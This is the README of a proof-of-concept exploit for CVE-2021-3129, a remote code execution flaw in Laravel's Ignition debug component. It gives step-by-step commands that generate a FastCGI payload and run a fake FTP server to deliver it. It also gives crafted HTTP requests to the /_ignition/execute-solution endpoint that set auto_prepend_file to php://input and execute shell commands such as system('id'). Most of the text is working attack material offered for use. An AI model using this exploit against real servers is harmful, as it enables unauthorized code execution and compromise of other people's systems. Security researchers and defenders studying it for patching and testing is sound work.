# Laravel <= 8.4.2 (Ingnition < 2.5.2) FTP => PHP-FPM RCE PoC exploit
Exploit for CVE-2021-3129

Overall details: https://www.ambionics.io/blog/laravel-debug-rce

# Usage
1. Generate a FastCGI payload binary file. The last argument in the command is the path to the PHP script on the system. Here it does not matter whether it exists or not, only the .php extension is important. Valid extensions for php-fpm are described in the directive `security.limit_extensions`, in php-fpm 7.3, for example, by default it looks like this: `security.limit_extensions = .php .php3 .php4 .php5 .php7`.
```
python3 fcgi_packet_generator.py -c "" -p 9000 127.0.0.1 "/tmp/x.php"
> True
```
2. Serve the payload binary file (exploit.bin hardcoded) with `serve_file_pasv.py`.
```
python3 serve_file_pasv.py
> Serve exploit.bin at 192.168.99.1:65123
```
3. Start an FTP server, which will send the victim to the right places for successful exploitation.
```
python3 fake_ftp.py
> Welcome to FakeFTP
```
4. Send a request to the framework, where we specify the address of our fake FTP server.
```
POST /_ignition/execute-solution HTTP/1.1
Host: laravelrce.vh:8080
Accept: */*
Accept-Language: en
Connection: close
Content-Type: application/json
Content-Length: 188

{
  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
  "parameters": {
    "variableName": "username",
    "viewFile": "ftp://192.168.99.1/test.txt"
  }
}
```

5. Payload sets the option `auto_prepend_file` to `php://input` in PHP-FPM, so whatever is sent in the next requests will be handled by the PHP interpreter.

`fcgi_packet_generator.py`:

    253:         'PHP_VALUE': 'auto_prepend_file = php://input',

```
POST /_ignition/execute-solution HTTP/1.1
Host: laravelrce.vh:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 38

<?php echo('Hello!'); system('id'); ?>
```

6. Profit.

![Prepare and send exploit to Ingintion endpoint in Laravel framework](https://github.com/allyshka/exploits/blob/master/laravel/CVE-2021-3129/exploit-0.png?raw=true)

![Laravel exploitation success](https://github.com/allyshka/exploits/blob/master/laravel/CVE-2021-3129/exploit-1.png?raw=true)

# Credits
- FastCGI payload generator (fcgi_packet_generator.py) is based on [Fastcgi PHP-FPM Client && Code Execution script](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75) from [@phith0n](https://github.com/phith0n).
- Fake FTP server (fake_ftp.py) for payload delivery is based on [fake_ftp.py](https://github.com/dfyz/ctf-writeups/blob/master/hxp-2020/resonator/fake_ftp.py) script from [Ivan @dfyz Komarov](https://github.com/dfyz).
- Thanks to [@i_bo0om](https://twitter.com/i_bo0om) for help in testing and debugging this exploit. I recommend explore his research about exploiting vulnerabilities using FTP-server â€” <https://speakerdeck.com/bo0om/ftp2rce>